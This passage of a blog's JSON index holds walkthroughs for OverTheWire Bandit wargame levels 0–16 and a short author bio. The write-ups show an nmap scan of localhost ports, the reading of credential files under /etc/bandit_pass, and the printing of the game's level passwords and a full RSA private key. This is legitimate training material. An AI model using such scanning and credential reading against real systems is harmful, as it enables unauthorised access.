flag to sort them based on the service running on each port. (-sV, see doc)\nScan phase (may take a while) bandit16@bandit:~$ nmap -sV localhost -p31000-32000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 14:05 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00014s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo 31691/tcp open echo 31790/tcp open ssl/unknown 31960/tcp open echo . . . Connect As we could see previously, there are 5 open ports in the range out of which, only 2 use SSL encryption. Now we use openssl just like in the previous level for the ports 31518,31790.\nNote. If at the time of you doing this your key starts with k like mine, try using -quiet in order to not KEYUPDATE. bandit16@bandit:~$ openssl s_client -connect localhost:31790 -quiet Can\u0026#39;t use SSL_get_servername depth=0 CN = SnakeOil verify error:num=18:self-signed certificate verify return:1 depth=0 CN = SnakeOil verify return:1 kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY-----\nConnect to bandit 17 You can see that the ouput after inserting the correct key was a private key. Copy that key into somefile.private and connect to bandit17 as you normally would but also add the flag -i in combination with the file where you copied the private key.\n","date":"2024-08-18T16:56:29+03:00","permalink":"//localhost:1313/post/bandit16/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 16"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption. Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.\nLogin ssh bandit15@bandit.labs.overthewire.org -p 2220\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\nDoc openssl (1ssl) - OpenSSL command line program man openssl - for all the use cases and flags Solution The only difference between this level and the previous one is the fact that the medium is using SSL\\TLS encryption. We can achieve that by connecting through openssl and then posting the current level`s password. bandit15@bandit:~$ openssl s_client -connect localhost:30001 CONNECTED(00000003) Can\u0026#39;t use SSL_get_servername depth=0 CN = SnakeOil verify error:num=18:self-signed certificate verify return:1 depth=0 CN = SnakeOil verify return:1 --- . . . read R BLOCK 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo Correct! kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx --flag\n","date":"2024-08-18T16:40:00+03:00","permalink":"//localhost:1313/post/bandit15/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 15"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.\nLogin ssh bandit14@bandit.labs.overthewire.org -p 2220\nMU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS\nDoc nc (1) - arbitrary TCP and UDP connections and listens usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port] Solution The sollution for this level is pretty straight forward, just transmit the current password to localhost on port 30000 using netcat nc. bandit14@bandit:~$ nc localhost 30000 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS Correct! 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo\n","date":"2024-08-18T16:34:58+03:00","permalink":"//localhost:1313/post/bandit14/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 14"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on.\nLogin ssh bandit13@bandit.labs.overthewire.org -p 2220\nFO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\nDoc ssh (1) - OpenSSH remote login client usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J destination] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-P tag] [-p port] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command [argument ...]] ssh [-Q query_option] A bit of backstory An SSH key is a secure access credential used in the Secure Shell (SSH) protocol. SSH key pairs use public key infrastructure (PKI) technology, the gold standard for digital identity authentication and encryption, to provide a secure and scalable method of authentication. Source\nSolution By using ls, you can see that there`s a file named sshkey.private. Since it is stated that only bandit14 has access to the flag stored in /etc/bandit_pass/bandit14 our approach should be making our request as bandit14. When sshing you can use a key as your login method instead of the text password we were used to until now by specifing the -i flag. bandit13@bandit:~$ ls sshkey.private Since bandit13, the endpoint we are also on, is hosted on bandit.labs.overthewire.org, we can simply specify localhost as the host and use ssh in pair with the key to connect and then just cat the respective file. bandit13@bandit:~$ ls sshkey.private bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 The authenticity of host \u0026#39;[localhost]:2220 ([127.0.0.1]:2220)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory \u0026#39;/home/bandit13/.ssh\u0026#39; (Permission denied). Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | \u0026#39;_ \\ / _` | \u0026#39;_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .\u0026#39; : .--\u0026#39;. \u0026#39; ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .\u0026#39;___,/ ,\u0026#39; .--\u0026#39;. \u0026#39; \\\u0026#39; . ; | ; \\ ; | | : | /___/ \\ | \u0026#39; \u0026#39; | : | ; | \u0026#39; ; |.\u0026#39;; ; ; \\ \\; : . | \u0026#39; \u0026#39; \u0026#39; : `----\u0026#39; | | \\ ; ` | \u0026#39; ; \\; / | \u0026#39; : ; . \\ .\\ ; \\ \\ \u0026#39;, / | | \u0026#39; \\ \\ \u0026#39; \\ | ; : / \u0026#39; : | : \u0026#39; |--\u0026#34; \\ \\ .\u0026#39; ; |.\u0026#39; \\ \\ ; www. `---` ver \u0026#39;---\u0026#39; he \u0026#39;---\u0026#34; ire.org Welcome to OverTheWire! .... Enjoy your stay! bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS\n","date":"2024-08-18T15:18:52+03:00","permalink":"//localhost:1313/post/bandit13/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 13"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work. Use mkdir with a hard to guess directory name. Or better, use the command “mktemp -d”. Then copy the datafile using cp, and rename it using mv (read the manpages!).\nLogin ssh bandit12@bandit.labs.overthewire.org -p 2220\n7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4\nDoc file (1) - determine file type tar (1) - an archiving utility gzip (1) - compress or expand files bzip2 (1) - a block-sorting file compressor, v1.0.8 xxd (1) - make a hex dump or do the reverse. Solution The solution for this level is pretty long and tedious. It`s all about understanding how files are compressed, how to see what a random file in memory actually is and how to get the data behind it.\nStep 1. Using mktemp -d you can create a temporary directory in the /tmp path in order to process certain files or create stuff where you otherwise wouldn`t have permissions to do so. We will move the initial data.txt to our new directory and use xxd since we know from the start it is a hexdump. bandit12@bandit:~$ ls data.txt bandit12@bandit:~$ mktemp -d /tmp/tmp.esFHBLf5iQ bandit12@bandit:~$ cp data.txt /tmp/tmp.esFHBLf5iQ/data.txt bandit12@bandit:~$ cd /tmp/tmp.esFHBLf5iQ bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ cat data.txt | xxd -r \u0026gt; data\nStep 2. After every decompression, it is important to check what type of data we have on our hands using file and apply the appropriate tools until we get to something human readable.\nbandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: gzip compressed data, was \u0026#34;data2.bin\u0026#34;, last modified: Wed Jul 17 15:57:06 2024, max compression, from Unix, original size modulo 2^32 577 bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data.gz data.txt bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ rm data.txt bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ gzip -d data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data data.bz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ bzip2 -d data.bz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: gzip compressed data, was \u0026#34;data4.bin\u0026#34;, last modified: Wed Jul 17 15:57:06 2024, max compression, from Unix, original size modulo 2^32 20480 bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ gzip -d data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ tar -xf data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data5.bin data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data5.bin data5.bin: POSIX tar archive (GNU) bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ rm data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data5.bin data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ tar -xf data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data6.bin data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ rm data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data6.bin data6.bin: bzip2 compressed data, block size = 900k bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data6.bin data.bz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ bzip2 -d data.bz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: POSIX tar archive (GNU) bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ tar -xf data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data8.bin data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ rm data.tar bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data8.bin data8.bin: gzip compressed data, was \u0026#34;data9.bin\u0026#34;, last modified: Wed Jul 17 15:57:06 2024, max compression, from Unix, original size modulo 2^32 49 bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ mv data8.bin data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ gzip -d data.gz bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ ls data bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ file data data: ASCII text Step 3. Wrapping up We can see that we`ve hit an ASCII file. Now using cat, the output of the file should be the flag. bandit12@bandit:/tmp/tmp.esFHBLf5iQ$ cat data The password is FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn\n","date":"2024-08-18T14:22:07+03:00","permalink":"//localhost:1313/post/bandit12/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 12"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions.\nLogin ssh bandit11bandit.labs.overthewire.org -p 2220\ndtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\nSources Ascii code\nDoc cat (1) - concatenate files and print on the standard output Solution By using cat we get the contents of the single file present in the directory. We can see that the present data makes up a string. By simply rotating every character in this string ascendingly by the value 13 we could in theory get the correct answer. I`ve copied the output from data.txt into my own terminal, made a c++ program that increases each element in a character array by 13 and then print out the answer. bandit11@bandit:~$ ls data.txt bandit11@bandit:~$ cat data.txt Gur cnffjbeq vf 7k16JArUVv5LxVuJfsSVdbbtaHGlw9D4\nC++ code and compilation #include \u0026lt;iostream\u0026gt; using namespace std; //Gur cnffjbeq vf 7k16JArUVv5LxVuJfsSVdbbtaHGlw9D4 //rot by 13 char v[100] = {\u0026#39;G\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;4\u0026#39;}; int main() { for (int i = 0; i \u0026lt; 48; i++) { if (v[i] \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; v[i] \u0026lt;= \u0026#39;Z\u0026#39;) { v[i] = (v[i] - \u0026#39;A\u0026#39; + 13) % 26 + \u0026#39;A\u0026#39;; } else if (v[i] \u0026gt;= \u0026#39;a\u0026#39; \u0026amp;\u0026amp; v[i] \u0026lt;= \u0026#39;z\u0026#39;) { v[i] = (v[i] - \u0026#39;a\u0026#39; + 13) % 26 + \u0026#39;a\u0026#39;; } } for (int i = 0; i \u0026lt; 48; i++) { cout \u0026lt;\u0026lt; v[i]; } return 0; } 02:09:33 archie@Archie c++ → g++ decrypt.cpp -o out 02:10:29 archie@Archie c++ → ./out The password is 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4 ","date":"2024-08-17T22:42:32+03:00","permalink":"//localhost:1313/post/bandit11/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 11"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt, which contains base64 encoded data.\nLogin ssh bandit10@bandit.labs.overthewire.org -p 2220\nFGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey\nDoc base64 (1) - base64 encode/decode data and print to standard output -d, --decode decode data Solution Use the -d flag (decode) on the data.txt file by using the base64 command. bandit10@bandit:~$ base64 -d data.txt The password is dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr\n","date":"2024-08-17T22:35:17+03:00","permalink":"//localhost:1313/post/bandit10/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 10"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.\nLogin ssh bandit9@bandit.labs.overthewire.org -p 2220\n4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\nDoc strings (1) - print the sequences of printable characters in files grep (1) - print lines that match patterns Solution Use strings to only recieve the string values out of the text file, pipe it to grep using \u0026ldquo;=\u0026rdquo; as the pattern you are searching for. bandit9@bandit:~$ strings data.txt | grep = =aA\u0026#34;f \\a!;========== the PWAF=1 M),\\}= 2Y6= G\u0026#39;;?e= ========== passwordf ========== isc *=N6 m=\u0026lt;/ E=Bty =sw\t\u0026#34;M1= ========== FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey !\u0026amp;=u\u0026amp;4$ *XA=\n","date":"2024-08-17T22:25:00+03:00","permalink":"//localhost:1313/post/bandit9/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 9"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt and is the only line of text that occurs only once.\nLogin ssh bandit8@bandit.labs.overthewire.org -p 2220\ndfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\nDoc sort (1) - sort lines of text files uniq (1) - report or omit repeated lines -c, --count prefix lines by the number of occurrences -u, --unique only print unique lines | -pipe operator Solution We pipe the ouput of sort (in order to get the identical lines one after the other) and pipe the output to unique using the flags -c (counting just to make sure) and -u(unique) bandit8@bandit:~$ sort data.txt | uniq -cu 1 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM\n","date":"2024-08-17T21:57:43+03:00","permalink":"//localhost:1313/post/bandit8/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 8"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the file data.txt next to the word millionth\nLogin ssh bandit7@bandit.labs.overthewire.org -p 2220\nmorbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\nDoc cat (1) - concatenate files and print on the standard output grep (1) - print lines that match patterns Solution We can use cat to get the contents of the file in question, feed it to grep using a pipe | with the argument of millionth in order for it to spit out the line where the pattern matches. bandit7@bandit:~$ cat data.txt | grep millionth millionth\tdfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc\n","date":"2024-08-17T18:16:02+03:00","permalink":"//localhost:1313/post/bandit7/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 7"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored somewhere on the server and has all of the following properties:\n-owned by user bandit7\n-owned by group bandit6\n-33 bytes in size\nLogin ssh bandit6@bandit.labs.overthewire.org -p 2220\nHWasnPhtq9AVKe0dmk45nxy20cvUa6EG\nDoc find (1) - search for files in a directory hierarchy Solution Firstly, I searched the home directory since its smaller than the root in case the file was hidden there. After seeing that it was not, I used find in root / to see that there exists a file with my defined conditions at /var/lib/dpkg/info/bandit7.password. bandit6@bandit:~$ find /home -user bandit7 -group bandit6 -size 33c find: ‘/home/drifter8/chroot’: Permission denied find: ‘/home/bandit5/inhere’: Permission denied find: ‘/home/bandit31-git’: Permission denied find: ‘/home/bandit29-git’: Permission denied find: ‘/home/ubuntu’: Permission denied find: ‘/home/bandit30-git’: Permission denied find: ‘/home/bandit28-git’: Permission denied find: ‘/home/drifter6/data’: Permission denied find: ‘/home/bandit27-git’: Permission denied bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c find: ‘/sys/kernel/tracing’: Permission denied find: ‘/sys/kernel/debug’: Permission denied . . . /var/lib/dpkg/info/bandit7.password . . . bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj\n","date":"2024-08-16T17:07:33+03:00","permalink":"//localhost:1313/post/bandit6/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 6"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:\n-human-readable\n-1033 bytes in size\n-not executable\nLogin ssh bandit5@bandit.labs.overthewire.org -p 2220\n4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\nDoc find (1) - search for files in a directory hierarchy Solution Make use of the find command to search by size and you can see that there`s only 1 file that matches. Even if there were other files, a simple ls -la would check the other conditions. bandit5@bandit:~/inhere$ find -size 1033c ./maybehere07/.file2 bandit5@bandit:~/inhere$ cd ./maybehere07/ bandit5@bandit:~/inhere/maybehere07$ cat .file2 HWasnPhtq9AVKe0dmk45nxy20cvUa6EG\n","date":"2024-08-15T17:07:30+03:00","permalink":"//localhost:1313/post/bandit5/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 5"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.\nLogin ssh bandit4@bandit.labs.overthewire.org -p 2220\n2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\nDoc cat (1) - concatenate files and print on the standard output Solution Cat files using operator until flag is found. bandit4@bandit:~/inhere$ cat \u0026lt; -file00 ,Yq�fL����x4Fbandit4@bandit:~/inhere$ cat \u0026lt; -file01 N�bandit4@bandit:~/inhere$ cat \u0026lt; -file02 9�F�p��tk%bandit4@bandit:~/inhere$ cat \u0026lt; -file03 nQy��͍{+R�ZkF*\tbandit4@bandit:~/inhere$ cat \u0026lt; -file04 l�]�߯-@gQ÷wzP�ybandit4@bandit:~/inhere$ cat \u0026lt; -file05 �ӻT9��3ˤ�� T՜F�bandit4@bandit:~/inhere$ cat \u0026lt; -file06 �QĹM�p4-��!#g�[?2004hbandit4@bandit:~/inhere$ cat \u0026lt; -file07 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw\n","date":"2024-08-14T17:07:27+03:00","permalink":"//localhost:1313/post/bandit4/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 4"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a hidden file in the inhere directory.\nLogin ssh bandit3@bandit.labs.overthewire.org -p 2220\nMNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\nDoc man (1) - an interface to the system reference manuals usefull ls flags: -a, --all do not ignore entries starting with . -A, --almost-all do not list implied . and .. Solution Use ls -a in order to see files precedented by .`s and navigate to the file then cat the file for the flag. bandit3@bandit:~$ ls inhere bandit3@bandit:~$ cd inhere/ bandit3@bandit:~/inhere$ ls bandit3@bandit:~/inhere$ ls -a . .. ...Hiding-From-You bandit3@bandit:~/inhere$ cat ...Hiding-From-You 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ\n","date":"2024-08-13T00:23:19+03:00","permalink":"//localhost:1313/post/bandit3/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 3"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a file called spaces in this filename located in the home directory.\nLogin ssh bandit2@bandit.labs.overthewire.org -p 2220\n263JGJPfgU6LtdEvgfWU1XP5yac29mFx\nDoc ls (1) - list directory contents cat (1) - concatenate files and print on the standard output Solution Simply use \u0026quot; \u0026quot; on the file in order to parse the parameter as a string, then get the result using cat. bandit2@bandit:~$ ls spaces in this filename bandit2@bandit:~$ cat \u0026#34;spaces in this filename\u0026#34; MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx\n","date":"2024-08-13T00:22:19+03:00","permalink":"//localhost:1313/post/amodel-bandit2/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 2"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a file called \u0026quot;-\u0026quot; located in the home directory\nLogin ssh bandit1@bandit.labs.overthewire.org -p 2220\nZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\nDoc cat (1) - concatenate files and print on the standard output Solution Using the redirecting operator \u0026lt; when can feed \u0026quot;-\u0026quot; to cat in order to see the contents of the file. bandit1@bandit:~$ cat \u0026lt; - 263JGJPfgU6LtdEvgfWU1XP5yac29mFx\n","date":"2024-08-12T00:23:19+03:00","permalink":"//localhost:1313/post/bandit1/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 1"},{"categories":["Overthewire","Bandit"],"contents":"Level goal The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.\nNote! For all bandit level logins, the default route is using ssh. Format: ssh bandit(level)@bandit.labs.overthewire.org -p 2220\nLogin ssh bandit0@bandit.labs.overthewire.org -p 2220\nbandit0\nDoc ls (1) - list directory contents cat (1) - concatenate files and print on the standard output Solution Use \u0026ldquo;ls\u0026rdquo; to list the files in the current directory and then \u0026ldquo;cat\u0026rdquo; to print the contents of readme. bandit0@bandit:~$ ls readme bandit0@bandit:~$ cat readme The password you are looking for is: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If\n","date":"2024-08-11T00:23:19+03:00","permalink":"//localhost:1313/post/bandit0/","section":"post","tags":["CTF","Completed"],"title":"Bandit-Level 0"},{"categories":null,"contents":"Who am I? My name is Alex Domnit, I am a third year student at Babeș-Bolyai University of Cluj-Napoca undergoing an English Mathematics and Computer Science Bachelor\u0026rsquo;s degree. I am a passionate cybersecurity enthusiast with a deep love for problem-solving and all things related to information security.\nPretty much, the entire collection of my academic and personal projects including any contests or hackatons I have been a part of can be found on my Github. If you want to keep up with my current journey and anything I`m working on in betweeen, you can find it in the Posts section with the tag of ongoing.\nThis is a hyperlink to my CV!\n","date":"2003-06-02T18:09:41+03:00","permalink":"//localhost:1313/about/aboutme/","section":"about","tags":null,"title":"About me"}]